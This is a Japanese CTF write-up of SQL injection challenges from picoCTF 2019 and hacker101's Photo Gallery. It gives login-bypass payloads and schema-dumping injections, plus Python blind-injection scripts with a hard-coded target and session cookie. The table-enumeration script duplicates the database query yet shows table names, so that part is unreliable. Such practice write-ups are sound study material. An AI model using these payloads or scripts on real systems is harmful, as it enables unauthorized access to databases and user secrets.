# writeup

# 常設の練習
## picoCTF 2019
https://ctftime.org/task/9545  
### login bypass (Irish-Name-Repo 1)
`https://2019shell1.picoctf.com/problem/47253/`  
SQLインジェクションでadminとしてログインする。  

`admin`,`' or 1=1 -- -`でログイン成功！  
### login bypass (Irish-Name-Repo 2)
`https://2019shell1.picoctf.com/problem/60775/`  
`admin' --`,`なんでも`でusernameの方のSQLインジェクションで成功！  
passwordの方がフィルタリングされてるらしい。`or`が使えないので`||`とかで代用したりいろいろしたがダメだった。  
```txt
// 成功したやつ
admin' --
admin' -- -
admin' ; --
admin' ;#

// 成功しなかったやつ
admin' #
```
### login bypass (Irish-Name-Repo 3)
`https://2019shell1.picoctf.com/problem/47247/`  
htmlのhiddenとして`debug=0`という値をフォームでパスワードと一緒に送信しているので`debug=1`とすると、実行しようとしている
SQL構文がわかる。どうやらpasswordのテキストをrot13で変換してからSQLに突っ込んでいるらしい。  
`' be 1 -- -`とすると`' or 1 -- -`と変換されて以下のように成功！  
```txt
SQL query: SELECT * FROM admin where password = '' or 1 -- -'
```
### SQLite / Union query (Empire1)
`https://2019shell1.picoctf.com/problem/4155/index`  
![image](https://user-images.githubusercontent.com/56021519/103904535-be749400-5140-11eb-906a-43c20766de27.png)  
ログインページにSQLインジェクションがあるかと思えばそういうわけじゃない。  
適当にRegisterして入ってみる。  
![image](https://user-images.githubusercontent.com/56021519/103904708-fa0f5e00-5140-11eb-8396-72ab168d4a4c.png)  
いろいろ試した結果、`Add a Todo`の`'`を挿入するとInternal Server Errorが返り、SQLインジェクションに脆弱だとわかる。  
![image](https://user-images.githubusercontent.com/56021519/103904777-14493c00-5141-11eb-963e-9cbf02554d78.png)  
次にInternal Server Errorが出ないようにして有効にSQLとして動くInjectionを探す。  
Your TodosでSQL実行結果を確認できる。  
```txt
// Internal Server Error
'
' or 1
' or 1=! -- -

// エラーがでない
' || 1=1 || '     1が返る
' || 1=2 || '     0が返る
```
したがって、`' || <SQL>  || '`の構文ならInternal Server Errorを出さずにSQL実行できるとわかる！  
次に、問題文からsecretをDBから取り出す必要があるので、DBを特定する必要がある。  
`' || @@version || '`が成功すればMySQLかMSSQL、`' || version() || '`ならPostgeSQL、`' || sqlite_version() || '`ならSQLiteとわかる。  
今回はSQLiteのやつで`3.22.0 `が返る！  
https://sqliteonline.com/  
ここで適宜ちゃんとSQLite上で動作できるのか触りながらやるとよさそう。  
SQLiteでは、以下のようにして、DB内に存在するテーブルやカラムなどを表示できる！超楽！  
`group_concat()`を使わないと、一つずつしか返ってこない。`users,apps`とかの場合は`users`しか返してくれないので。  
```txt
// 存在するテーブル一覧を返す
SELECT tbl_name FROM sqlite_master
SELECT group_concat(tbl_name) FROM sqlite_master

// 存在するテーブルとそのカラムをセットで返す。こっちの方が情報量多い
SELECT sql FROM sqlite_master
SELECT group_concat(sql) FROM sqlite_master
```
以下のようにして`user`テーブルの`secret`カラムのデータを呼び出すとフラグゲット！  
```txt
' || (SELECT group_concat(secret) FROM user) || '
Likes Oreos.,Know it all.,picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4},picoCTF{wh00t_it_a_sql_injectd75ebff4} 

' || (SELECT secret FROM user) || '
Likes Oreos. 

' || (SELECT group_concat(tbl_name) FROM sqlite_master) || '
user,user,todo 

' || (SELECT tbl_name FROM sqlite_master) || '
user

' || (SELECT * FROM sqlite_master) || '
Internal Server error

' || (union select 10) || '
Internal Server error

' || (SELECT group_concat(sql) FROM sqlite_master) || '
CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(64), name VARCHAR(128), password_hash VARCHAR(128), secret VARCHAR(128), admin INTEGER, PRIMARY KEY (id) ),CREATE UNIQUE INDEX ix_user_username ON user (username),CREATE TABLE todo ( id INTEGER NOT NULL, item VARCHAR(256), user_id INTEGER, PRIMARY KEY (id), FOREIGN KEY(user_id) REFERENCES user (id) ) 
```

## hacker101 CTF
### (Photo Gallery)
`https://ctf.hacker101.com/ctf`  
以下のページが問題。  
![image](https://user-images.githubusercontent.com/56021519/103919476-698e4900-5153-11eb-81ed-604ffc2c9917.png)  
`http://35.227.24.107/2116b46989/fetch?id=1`で`1`,`2`の時に画像データを返すらしい。  
おそらく`select data from images where id=1`とかになってるはずと推測する(idはintなので)。  
`1 and 1=1 -- -`で画像データが返り、`1 and 1=2 -- -`でなNot Foundが返ったのでBlind可能！  
Union queryも試したがダメっぽい？  
```txt
1 union select 1 -- -
1に対応する猫の画像が返った

0 union select 1 -- -
internal server error
```
以下のようにhttps://sqliteonline.com/で実験すると、`id=0`として失敗させたときは`union select`が取り出されると思ったんだけど……  
![image](https://user-images.githubusercontent.com/56021519/103920720-f7b6ff00-5154-11eb-86d9-fabb4b5fad14.png)  
![image](https://user-images.githubusercontent.com/56021519/103920784-0bfafc00-5155-11eb-9313-b2415a015930.png)  
以下の単純な全探索のBlindで`@@version`を試している。これでバージョンがゲットできたので、DBはMySQLとわかる。  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_","-","+","@","$","!","?","&",".","#"]
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_pass_query(pw):
    query = " and if(substr(@@version," + str(len(pw)) + ",1)='" + pw[-1] + "',1=1,1=3) -- -"
    #print(query)
    return query

def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

####################
###     main     ###
####################

# find pw
fix_pass = ""
is_end = False
while not is_end:
    for c in candidates:
        try_pass = fix_pass + str(c)
        print(try_pass)
        query = create_pass_query(try_pass)
        res = attack(query)
        if check_result(res):
            fix_pass += c
            break
        if c == '#':
            is_end = True
            

print("result: " + fix_pass)
```
**mysql-enum-databases-get-binarysearch.py**  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_length_query(md,times):
    query = " and if(length((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " and if(ascii(substr((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query


def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

### main     ###
####################

def exploit_length(times):
    ok = 0
    ng = 100
    while ok + 1 != ng:
        md = (ok + ng) // 2
        print("    [+] try " + str(md) + "  times:" + str(times))
        query = create_length_query(md,times)
        res = attack(query)
        if check_result(res):
            ok = md
        else:
            ng = md
    print("")
    print("length: " + str(ok) + "  " +str(times) + " times")
    print("")
    return ok
        
def exploit_2tansaku(length,times):
    fix_pass = ""
    for i in range(0,length):
        ok = 0
        ng = 127
        while ok + 1!= ng:
            md = (ok + ng) // 2
            print("    [+] try " + str(md) + "  i: " + str(i) + "  times:" + str(times))
            query = create_2tansaku_query(md,i+1,times)
            res = attack(query)
            if check_result(res):
                ok = md
            else:
                ng = md
        print(str(ok))
        fix_pass += str(chr(ok))
        print("")
        print("progress: " + str(i+1) +"/" + str(length))
        print("result: " + fix_pass)
        print("")
    return fix_pass

#length = exploit_length()
#length = 24
#exploit_2tansaku(int(length))

result = []
loop_times = 100

for i in range(loop_times):
    print("[*] " + str(i) + " times")
    print("")
    length = exploit_length(i)
    res = exploit_2tansaku(length,i)
    if(res == ""):
        print("[-] fix_pass is None. loop break")
        break
    result.append(res)

print("")
print("[-] exploit finished")
[print(a) for a in result]
```
```txt
$ python3 mysql-enum-databases-get-binarysearch.py

省略

[-] exploit finished
information_schema
level5
mysql
performance_schema
```
**mysql-enum-tables-get-binarysearch.py**  
```python
#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import requests
import urllib.parse
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

url = "http://35.227.24.107/2116b46989/fetch"
cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
headers= {'Cookie':'PHPSESSID='+cookie}

def attack(attack_sql):
    attack_url = url + "?id=1" + urllib.parse.quote(attack_sql)
    #print(attack_url)
    res = requests.get(attack_url, headers=headers,verify=False)
    #print(res.text)
    return res

def create_length_query(md,times):
    query = " and if(length((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query

def create_2tansaku_query(md,i,times):
    query = " and if(ascii(substr((SELECT table_schema from  information_schema.columns group by table_schema limit " +str(times) +",1)," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3) -- -"
    #print(query)
    return query


def check_result(res):
    if '404 Not Found' in res.text:
        return False
    if '500 Internal Server Error' in res.text:
        return False
    return True

### main     ###
####################

def exploit_length(times):
    ok = 0
    ng = 100
    while ok + 1 != ng:
        md = (ok + ng) // 2
        print("    [+] try " + str(md) + "  times:" + str(times))
        query = create_length_query(md,times)
        res = attack(query)
        if check_result(res):
            ok = md
        else:
            ng = md
    print("")
    print("length: " + str(ok) + "  " +str(times) + " times")
    print("")
    return ok
        
def exploit_2tansaku(length,times):
    fix_pass = ""
    for i in range(0,length):
        ok = 0
        ng = 127
        while ok + 1!= ng:
            md = (ok + ng) // 2
            print("    [+] try " + str(md) + "  i: " + str(i) + "  times:" + str(times))
            query = create_2tansaku_query(md,i+1,times)
            res = attack(query)
            if check_result(res):
                ok = md
            else:
                ng = md
        print(str(ok))
        fix_pass += str(chr(ok))
        print("")
        print("progress: " + str(i+1) +"/" + str(length))
        print("result: " + fix_pass)
        print("")
    return fix_pass

#length = exploit_length()
#length = 24
#exploit_2tansaku(int(length))

result = []
loop_times = 100

for i in range(loop_times):
    print("[*] " + str(i) + " times")
    print("")
    length = exploit_length(i)
    res = exploit_2tansaku(length,i)
    if(res == ""):
        print("[-] fix_pass is None. loop break")
        break
    result.append(res)

print("")
print("[-] exploit finished")
[print(a) for a in result]

```
```txt
$ python3 mysql-enum-tables-get-binarysearch.py

[-] exploit finished
albums
photos
```
```txt
[-] exploit finished
columns_priv
column_stats
db
event
func
general_log
gtid_slave_pos
help_category
help_keyword
help_relation
help_topic
host
index_stats
innodb_index_stats
innodb_table_stats
plugin
proc
procs_priv
proxies_priv
roles_mapping
servers
slow_log
tables_priv
table_stats
time_zone
time_zone_leap_second
time_zone_name
time_zone_transition
time_zone_transition_type
user
```
**photosのカラム数**  
```txt
$ python3 mysql-count-columns-get-fullsearch.py
0
 AND if(substr((SELECT count(distinct column_name) from  information_schema.columns where table_schema like 'level5' AND table_name like 'photos'),1,1)='0',1=1,1=3)#
 
result: 4
```
**albumsのカラム**  
```txt
[-] exploit finished
id
title
```
**photosのカラム**  
```txt
result: id,title,filename,parent
```
# メモ
https://www.hamayanhamayan.com/entry/2020/06/25/222618  
https://graneed.hatenablog.com/entry/2019/12/29/115100#SQL-Injection  
https://graneed.hatenablog.com/entry/2018/12/16/003745  
https://sqliteonline.com/  
